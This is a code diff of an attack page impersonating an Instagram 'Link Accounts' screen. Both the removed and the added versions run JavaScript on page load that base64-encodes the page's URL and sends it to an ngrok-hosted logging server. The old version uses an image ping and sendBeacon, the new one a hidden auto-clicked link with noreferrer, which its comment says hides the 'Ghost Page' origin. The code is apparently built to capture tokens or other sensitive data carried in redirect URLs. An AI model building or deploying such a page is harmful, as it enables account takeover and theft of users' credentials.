@@ -1,45 +1,23 @@
-   <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Link Accounts | Instagram</title>
-    <style>
-        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 8px; text-align: center; max-width: 350px; }
-        .btn { background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 600; width: 100%; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="60">
-        <h2>Connection Timeout</h2>
-        <p>Please return to Facebook to resume the process.</p>
-        <button class="btn" onclick="goBack()">Return to Facebook</button>
-    </div>
+   <script>
+    function capture() {
+        // 1. Get the sensitive URL
+        var currentUrl = window.location.href;
+        
+        // 2. Prepare the payload
+        var target = "https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(currentUrl);
+        
+        // 3. Create a hidden anchor element
+        var link = document.createElement('a');
+        link.href = target;
+        link.rel = "noreferrer"; // This hides the fact that we came from a 'Ghost Page'
+        
+        // 4. Append and Click
+        document.body.appendChild(link);
+        link.click();
+    }
 
-    <script>
-        (function() {
-            console.log("🚀 STARTING EXFIL...");
-            // MAKE SURE THIS MATCHES YOUR PYCHARM TERMINAL EXACTLY
-            const pythonServer = "https://bolsteringly-rightish-joan.ngrok-free.dev/log";
-            const capturedData = window.location.href;
-            const payload = "?data=" + btoa(capturedData);
-
-            // Method 1: Image Ping
-            const img = new Image();
-            img.src = pythonServer + payload;
-
-            // Method 2: Beacon (More reliable for redirects)
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(pythonServer + payload);
-            }
-            
-            console.log("📡 DATA SENT TO: " + pythonServer);
-        })();
-
-        function goBack() {
-            window.location.href = "https://www.facebook.com/settings";
-        }
-    </script>
-</body>
-</html>
+    // Trigger after a slight delay to let the page settle
+    window.onload = function() {
+        setTimeout(capture, 500);
+    };
+</script>
